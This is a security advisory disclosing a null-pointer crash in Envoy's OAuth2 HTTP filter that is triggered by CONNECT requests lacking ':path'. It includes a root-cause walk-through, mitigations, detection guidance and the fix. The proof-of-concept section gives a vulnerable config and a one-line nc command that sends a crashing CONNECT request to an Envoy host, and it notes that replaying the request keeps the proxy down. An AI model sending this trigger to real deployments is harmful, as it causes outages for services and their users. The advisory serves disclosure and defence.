## Brief description

The OAuth2 HTTP filter (`envoy.filters.http.oauth2`) dereferences the `:path` pseudo-header without a null check, guarded only by an `ASSERT` that is compiled out of release builds. A classic HTTP `CONNECT` request legitimately carries no `:path`, and Envoy explicitly permits that. Any unauthenticated client that can reach a listener whose HTTP filter chain contains the OAuth2 filter can therefore crash the Envoy process with a single request.

## Affected component(s)

- `envoy.filters.http.oauth2` — `security_posture: robust_to_untrusted_downstream`, `status: stable`.
- Primary sink: `source/extensions/filters/http/oauth2/filter.cc:950-952` (`OAuth2Filter::decodeHeaders`).
- Second instance of the same defect, reachable on the redirect-to-authorization-server path once the first is fixed: `source/extensions/filters/http/oauth2/filter.cc:1275` (`OAuth2Filter::redirectToOAuthServer`).

## Attack vector(s)

A remote, unauthenticated client sends an HTTP `CONNECT` request in authority-form (or the HTTP/2 equivalent) to any listener running the OAuth2 filter. The worker process segfaults while processing the request headers. Because Envoy runs all workers in a single process, the entire proxy instance dies and all in-flight connections are dropped. The request can be replayed after every restart, so an attacker with a trivial loop can keep an edge Envoy permanently unavailable.

The most exposed deployment is exactly the one the filter is built for: an edge or ingress Envoy fronting an OAuth2-protected application, reachable from the public internet.

## Discoverer(s)/Credits

[threatroute66](https://github.com/threatroute66) (original reporter)

[Michael-JRead](https://github.com/Michael-JRead)
[kalt2212](https://github.com/kalt2212)

## Example exploit or proof-of-concept

Minimal reproducing configuration — a stock OAuth2 setup with an ordinary prefix route:

```yaml
static_resources:
  listeners:
  - name: listener_0
    address: { socket_address: { address: 0.0.0.0, port_value: 10000 } }
    filter_chains:
    - filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
          stat_prefix: ingress_http
          route_config:
            virtual_hosts:
            - name: local
              domains: ["*"]
              routes:
              - match: { prefix: "/" }        # ordinary route; no connect_matcher
                route: { cluster: service }
          http_filters:
          - name: envoy.filters.http.oauth2
            typed_config:
              "@type": type.googleapis.com/envoy.extensions.filters.http.oauth2.v3.OAuth2
              config:
                token_endpoint:
                  cluster: oauth
                  uri: https://example.com/token
                  timeout: 3s
                authorization_endpoint: https://example.com/authorize
                redirect_uri: "https://%REQ(:authority)%/callback"
                redirect_path_matcher: { path: { exact: "/callback" } }
                signout_path: { path: { exact: "/signout" } }
                credentials:
                  client_id: foo
                  token_secret: { name: token }
                  hmac_secret: { name: hmac }
          - name: envoy.filters.http.router
            typed_config:
              "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
```

Trigger, HTTP/1.1:

```
printf 'CONNECT anything:443 HTTP/1.1\r\nHost: anything:443\r\n\r\n' | nc <envoy-host> 10000
```

Trigger, HTTP/2 — a `HEADERS` frame with `:method: CONNECT` and `:authority: anything:443`, and **no** `:path`, `:scheme` or `:protocol` pseudo-headers.

Observed result: the connection closes with no response and the Envoy process terminates with SIGSEGV. In a debug build the same request aborts at `ASSERT(path_header != nullptr)`, `source/extensions/filters/http/oauth2/filter.cc:951`, which confirms the same code path.

Note there is deliberately **no** `upgrade_configs` and **no** `connect_matcher` in the config above — that is the default, and it is the vulnerable case. See "Details".

## Details

### The defect

`source/extensions/filters/http/oauth2/filter.cc:950-952`:

```cpp
const Http::HeaderEntry* path_header = headers.Path();
ASSERT(path_header != nullptr);
const absl::string_view path_str = path_header->value().getStringView();   // null dereference
```

`ASSERT` expands to `_NULL_ASSERT_IMPL` when `NDEBUG` is defined and neither `ENVOY_LOG_DEBUG_ASSERT_IN_RELEASE` nor `ENVOY_LOG_FAST_DEBUG_ASSERT_IN_RELEASE` is set (`source/common/common/assert.h:260`). In shipped release binaries line 951 is a no-op and line 952 dereferences `nullptr`.

### Why `:path` can be absent

A classic `CONNECT` request has no `:path`, and Envoy is explicit about permitting it. `HeaderUtility::checkRequiredRequestHeaders` (`source/common/http/header_utility.cc:497`) requires `:path` only in the non-CONNECT branch; for CONNECT it requires only `Host`, and separately rejects the mismatched combinations of `:path` and `:protocol` that would indicate a malformed extended CONNECT.

The HTTP/1 server codec never sets `:path` for a CONNECT: `ServerConnectionImpl::handlePath` parses the authority-form target through `Utility::Url::initialize(..., is_connect=true)`, which yields an empty `pathAndQueryParams()`, and the assignment is guarded (`source/common/http/http1/codec_impl.cc:1177`):

```cpp
if (!absolute_url.pathAndQueryParams().empty()) {
  headers.setPath(absolute_url.pathAndQueryParams());
}
```

The rest of core Envoy handles this correctly and defensively — `ConnectionManagerUtility::maybeNormalizePath` returns early on `!request_headers.Path()` (`conn_manager_utility.cc:785`), and the connection manager's `MissingPath` rejection is explicitly skipped for CONNECT (`conn_manager_impl.cc:1474`):

```cpp
if ((!HeaderUtility::isConnect(*request_headers_) || request_headers_->Path()) &&
    request_headers_->getPathValue().empty()) {
  sendLocalReply(Code::NotFound, "", ..., ResponseCodeDetails::get().MissingPath);
  return;
}
```

### Why the "route rejects CONNECT" path does not mitigate this

The natural assumption is that a route table without `upgrade_configs` for CONNECT rejects the request before the filter chain runs. It does not, in the common case.

The upgrade rejection at `conn_manager_impl.cc:1583-1592` is nested inside `if (hasCachedRoute())`:

```cpp
if (hasCachedRoute()) {
  if (create_chain_result.upgradeRejected()) {
    ...
    sendLocalReply(Code::Forbidden, "", ..., ResponseCodeDetails::get().UpgradeFailed);
    return;
  }
}
```

and `hasCachedRoute()` is `cached_route_.has_value() && cached_route_.value()` (`conn_manager_impl.h:423`) — false when no route matched.

For a path-less request, no route matches unless the operator configured one specifically for CONNECT. `RouteMatcher::route` skips every candidate whose `supportsPathlessHeaders()` returns false (`source/common/router/config_impl.cc:1824`):

```cpp
if (!route_match_context.headers().Path() && !(*route)->supportsPathlessHeaders()) {
```

and only `ConnectRouteEntryImpl` — a route built from a `connect_matcher` — overrides that to `true` (`source/common/router/config_impl.h:1181`). Prefix, path and safe_regex routes all return the base-class `false`.

So under any ordinary route table: no route matches → `hasCachedRoute()` is false → the 403 branch is skipped → execution falls through to `filter_manager_.decodeHeaders()` at `conn_manager_impl.cc:1604` → the OAuth2 filter runs → crash.

The only configuration that is *not* vulnerable is one where a `connect_matcher` route both matches the request and rejects CONNECT upgrades. If a `connect_matcher` route matches and *permits* CONNECT, the filter chain runs and the crash still occurs.

### Why no earlier code in the filter short-circuits

Between `OAuth2Filter::decodeHeaders` entry (line 895) and the dereference (line 952):

- lines 898-899 remove the `x-oauth-status` / failure-reason headers;
- line 906 returns `Continue` only if no config resolved;
- line 920 returns `Continue` only if a `pass_through_matcher` matches — none is configured by default;
- line 925 sends a local reply only if secrets are not yet loaded;
- line 934 `decryptAndUpdateOAuthTokenCookies` reads and rewrites only the `Cookie` header;
- line 941 removes the `Authorization` header;
- line 948 dereferences `headers.Host()`, which is safe because `Host` *is* required for CONNECT.

None of these depends on or guards `:path`.

### Precedent in the codebase

This class of bug is already recognised and fixed elsewhere, including in this same file:

- `source/extensions/filters/http/oauth2/filter.cc:1798` — `OAuth2Filter::shouldAllowFailed` uses exactly the correct idiom: `const Http::HeaderEntry* path_header = headers.Path(); if (path_header != nullptr) { ... }`
- `source/extensions/filters/http/jwt_authn/matcher.cc:125` — `if (headers.Path() == nullptr) { return false; }`
- `source/extensions/filters/http/header_mutation/header_mutation.cc:117` — `if (query_query_parameter_mutations_.empty() || headers.Path() == nullptr) { return; }`
- `source/common/router/router.cc:2210` — `if (!downstream_headers.Path()) { ... return false; }`
- `source/extensions/filters/common/rbac/matchers.cc:391` — `if (headers.Path() == nullptr) { return false; }`

`decodeHeaders` was simply not updated to match.

### Test coverage

`test/extensions/filters/http/oauth2/` contains no test that exercises a CONNECT request. This is why six years of test runs did not surface it.

## Mitigations

**Preferred: reject CONNECT before the OAuth2 filter.** Insert an RBAC filter *ahead of* `envoy.filters.http.oauth2` in `http_filters` that denies `:method: CONNECT`:

```yaml
- name: envoy.filters.http.rbac
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
    rules:
      action: DENY
      policies:
        deny-connect:
          permissions:
          - header: { name: ":method", string_match: { exact: "CONNECT" } }
          principals:
          - any: true
```

This is safe on path-less requests: the RBAC header matcher reads `:method`, which is always present, and RBAC's own path matcher explicitly handles a null `:path` (`source/extensions/filters/common/rbac/matchers.cc:391`).

**Alternative:** if the deployment genuinely needs neither CONNECT nor the OAuth2 filter on the same listener, separate them onto different listeners.

**Not a mitigation:** omitting `upgrade_configs`/CONNECT support from the route table. As shown above, that is the vulnerable configuration, not a safe one.

**Build-level:** compiling with `ENVOY_LOG_DEBUG_ASSERT_IN_RELEASE` converts the crash from a segfault into a controlled abort with a log line. It does not keep the process alive and is not a mitigation for availability.

## Detection

Because the process dies while handling the request, the offending request generally does not reach the access log. Look for:

1. **Fatal-error backtrace.** Envoy's fatal signal handler dumps a stack trace on SIGSEGV. An affected crash shows frames through `Envoy::Extensions::HttpFilters::Oauth2::OAuth2Filter::decodeHeaders` and `Envoy::Http::FilterManager::decodeHeaders`.
2. **Unexplained process restarts** on listeners running the OAuth2 filter, particularly repeated restarts at a steady interval, which indicates an attacker replaying the request.
3. **Upstream of the proxy**, if a load balancer or CDN logs requests Envoy never answered: `CONNECT` requests in authority-form with no path, immediately followed by a connection reset.
4. **Pre-emptively**, on unaffected or patched versions: an access log format including `%REQ(:METHOD)%` and `%REQ(:PATH)%` will show `CONNECT` with an empty path reaching listeners that run the OAuth2 filter. Any such entry indicates a request that would crash a vulnerable build.

## Fix

The filter now rejects requests without a :path header with a 400 Bad Request local reply (response code detail `oauth_missing_path`) rather than dereferencing the missing header.

## References

* Introducing commit: `c6bfd7f9f5` — "Add OAuth filter (#11268)", 2020-08-20
* Direct precedent for this defect class: CVE-2021-43824 (`jwt_authn` safe_regex null dereference), whose fix is the guard at `source/extensions/filters/http/jwt_authn/matcher.cc:125`
* Threat model: https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/security/threat_model
